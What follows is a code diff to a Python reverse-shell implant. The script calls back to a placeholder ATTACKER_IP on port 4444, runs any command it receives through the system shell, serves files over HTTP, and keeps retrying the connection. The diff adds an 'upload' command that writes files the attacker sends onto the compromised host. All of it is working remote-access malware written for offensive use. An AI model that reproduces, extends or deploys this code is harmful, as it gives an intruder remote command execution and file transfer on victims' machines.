@@ -4,7 +4,7 @@ import os
 import time
 import threading
 
-ATTACKER_IP = " ATTACKER IP"  #
+ATTACKER_IP = "ATTACKER_IP"  # Change to your attacker's IP
 PORT = 4444  # Reverse shell port
 HTTP_PORT = 8080  # File transfer HTTP server port
 
@@ -14,7 +14,19 @@ def start_http_server(directory):
     command = f"python -m http.server {HTTP_PORT}"
     subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-def reverse_shell():
+def receive_file(client, filename):
+    """Receives a file in binary mode without corruption"""
+    client.send(b"READY")  # Signal attacker to start sending
+    with open(filename, "wb") as f:
+        while True:
+            chunk = client.recv(4096)
+            if chunk.endswith(b"EOFEOFEOF"):  # End of File Marker
+                f.write(chunk[:-9])  # Remove EOF marker before writing
+                break
+            f.write(chunk)
+    client.send(f"File {filename} uploaded successfully.\n".encode())
+
+def connect_back():
     """Creates a reverse shell and handles commands from the attacker"""
     while True:
         try:
@@ -38,6 +50,10 @@ def reverse_shell():
                     else:
                         client.send("File not found.\n".encode())
 
+                elif cmd.startswith("upload "):
+                    filename = cmd.split(" ", 1)[1]
+                    receive_file(client, filename)
+
                 else:
                     output = subprocess.run(cmd, shell=True, capture_output=True)
                     client.send(output.stdout + output.stderr)
@@ -47,4 +63,4 @@ def reverse_shell():
             time.sleep(5)  # Avoid excessive reconnection attempts
 
 if __name__ == "__main__":
-    reverse_shell()
+    connect_back()
